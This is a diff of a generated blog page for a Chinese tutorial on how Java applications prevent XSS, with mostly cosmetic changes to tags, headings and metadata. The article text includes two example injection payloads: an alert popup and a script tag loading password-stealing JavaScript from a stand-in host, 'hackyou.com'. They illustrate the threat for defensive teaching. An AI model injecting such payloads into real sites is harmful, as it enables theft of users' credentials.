@@ -74,7 +74,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Network Security,java," />
+  <meta name="keywords" content="java,Network Security," />
 
 
 
@@ -90,17 +90,17 @@
 
 
 
-<meta name="description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理：我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的">
-<meta name="keywords" content="Network Security,java">
+<meta name="description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
+<meta name="keywords" content="java,Network Security">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java如何防范XSS攻击">
 <meta property="og:url" content="https://amosannn.github.io/2017/05/27/xss/index.html">
 <meta property="og:site_name" content="Amosannn">
-<meta property="og:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理：我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的">
-<meta property="og:updated_time" content="2017-05-27T16:05:46.630Z">
+<meta property="og:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
+<meta property="og:updated_time" content="2017-05-27T16:12:54.053Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Java如何防范XSS攻击">
-<meta name="twitter:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理：我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的">
+<meta name="twitter:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
 
 
 
@@ -320,7 +320,7 @@
       
         <h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
 <p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="external">wiki</a>里写的很清楚。</p>
-<h1 id="XSS原理："><a href="#XSS原理：" class="headerlink" title="XSS原理："></a>XSS原理：</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>惊不惊喜？<br><a id="more"></a></p>
 <h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><p>XSS通常有两类：</p>
@@ -363,9 +363,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Network-Security/" rel="tag"># Network Security</a>
-          
             <a href="/tags/java/" rel="tag"># java</a>
+          
+            <a href="/tags/Network-Security/" rel="tag"># Network Security</a>
           
         </div>
       
@@ -377,6 +377,10 @@
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/28/java-get-time/" rel="next" title="java-get-time">
+                <i class="fa fa-chevron-left"></i> java-get-time
+              </a>
             
           </div>
 
@@ -458,7 +462,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -535,7 +539,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS原理："><span class="nav-number">2.</span> <span class="nav-text">XSS原理：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞分类"><span class="nav-number">3.</span> <span class="nav-text">XSS漏洞分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何预防XSS"><span class="nav-number">4.</span> <span class="nav-text">如何预防XSS</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS原理"><span class="nav-number">2.</span> <span class="nav-text">XSS原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞分类"><span class="nav-number">3.</span> <span class="nav-text">XSS漏洞分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何预防XSS"><span class="nav-number">4.</span> <span class="nav-text">如何预防XSS</span></a></li></ol></div>
             
 
           </div>
